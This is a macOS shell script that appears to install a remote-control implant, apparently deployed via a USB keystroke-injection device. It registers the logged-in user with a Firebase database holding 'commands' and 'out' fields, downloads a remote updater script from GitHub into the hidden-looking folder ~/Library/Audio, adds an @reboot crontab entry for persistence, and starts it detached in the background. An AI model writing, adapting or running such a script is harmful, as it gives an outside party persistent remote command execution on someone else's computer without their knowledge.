sleep 5

install_python() {
    cd ~
    curl -O https://www.python.org/ftp/python/3.12.1/Python-3.12.1.tgz

    # Extract and compile
    tar xf Python-3.12.1.tgz
    cd Python-3.12.1
    # ./configure --prefix=$HOME/Library/Python/3.12
    # make
    # make install

    # Add to PATH
    echo 'export PATH="$HOME/Library/Python/3.12/bin:$PATH"' >>~/.zshrc
    source ~/.zshrc

    rm ~/Python-3.12.1.tgz
    rm -rf ~/Python-3.12.1
}

install_python

python3 -m ensurepip --upgrade

# cus it dont come with python
pip3 install requests

# add user.
curl -X PATCH -d "{\"$USER\": {\"commands\":[\"\"], \"executed\":false, \"name\":\"idk\", \"out\":\"\"}}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json

# curl 2_updater.sh
curl -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/2_updater.sh -o ~/Library/Audio/2_updater.sh

# RUN UPDATER @ REBOOT
# write out current crontab
crontab -l >mycron
# echo new cron into cron file
echo "@reboot ~/Library/Audio/2_updater.sh" >>mycron
# install new cron file
crontab mycron
rm mycron

# START UPDATER
sh ~/Library/Audio/2_updater.sh &
disown
